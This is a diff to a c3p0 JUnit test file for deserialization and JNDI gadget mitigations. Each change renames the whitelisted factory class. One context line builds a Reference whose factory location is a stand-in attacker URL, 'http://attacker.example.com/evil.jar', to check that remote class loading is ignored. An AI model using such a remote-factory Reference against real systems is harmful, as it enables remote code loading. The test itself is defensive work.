@@ -56,15 +56,15 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
 
         // Build a Reference with a whitelisted factory but a remote factoryClassLocation.
         // If remote class loading were active, resolution would attempt to fetch from this URL.
-        // JavaBeanObjectFactory uses ref.getClassName() to determine which class to instantiate.
+        // C3P0JavaBeanObjectFactory uses ref.getClassName() to determine which class to instantiate.
         Reference ref = new Reference(
             "java.util.HashMap",
-            "com.mchange.v2.naming.JavaBeanObjectFactory",
+            "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
             "http://attacker.example.com/evil.jar"
         );
 
         Set whitelist = new HashSet();
-        whitelist.add( "com.mchange.v2.naming.JavaBeanObjectFactory" );
+        whitelist.add( "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory" );
 
         // This should succeed using the local classpath, ignoring the remote URL
         Object result = ReferenceableUtils.referenceToObject( ref, null, null, null, whitelist );
@@ -89,7 +89,7 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
         );
 
         Set whitelist = new HashSet();
-        whitelist.add( "com.mchange.v2.naming.JavaBeanObjectFactory" );
+        whitelist.add( "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory" );
 
         try
         {
@@ -114,7 +114,7 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
         Reference ref = new Reference( "java.lang.Object", null, null );
 
         Set whitelist = new HashSet();
-        whitelist.add( "com.mchange.v2.naming.JavaBeanObjectFactory" );
+        whitelist.add( "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory" );
 
         try
         {
@@ -143,7 +143,7 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
     {
         Reference ref = new Reference(
             "java.lang.Object",
-            "com.mchange.v2.naming.JavaBeanObjectFactory",
+            "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
             null
         );
 
@@ -444,7 +444,7 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
             {
                 return new Reference(
                     "java.util.HashMap",
-                    "com.mchange.v2.naming.JavaBeanObjectFactory",
+                    "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
                     null
                 );
             }
@@ -494,7 +494,7 @@ public final class DeserializationGadgetMitigationsJUnitTestCase extends TestCas
             {
                 return new Reference(
                     "java.util.HashMap",
-                    "com.mchange.v2.naming.JavaBeanObjectFactory",
+                    "com.mchange.v2.c3p0.impl.C3P0JavaBeanObjectFactory",
                     null
                 );
             }
